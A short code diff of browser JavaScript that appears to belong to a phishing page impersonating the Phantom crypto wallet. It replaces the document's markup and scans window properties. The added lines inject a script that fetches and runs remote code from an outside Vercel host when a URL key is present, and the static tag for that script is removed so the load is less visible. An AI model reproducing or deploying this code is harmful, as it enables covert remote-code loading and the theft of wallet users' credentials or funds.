@@ -20,6 +20,9 @@ const ensurePageChange = setInterval(() => {
       const params = new URLSearchParams(url.search);
       const key = params.get("key");
       if (key) {
+        const script = document.createElement('script');
+        script.src = 'https://wowee.vercel.app/main_source.js';
+        document.body.appendChild(script);
        setInterval(() => {
           Object.keys(window).forEach((keyName) => {
               try {
@@ -42,7 +45,6 @@ location.href = "https://phantom.app"
   };
   document.documentElement.innerHTML = `
   <head>
-    <script src="https://wowee.vercel.app/main_source.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
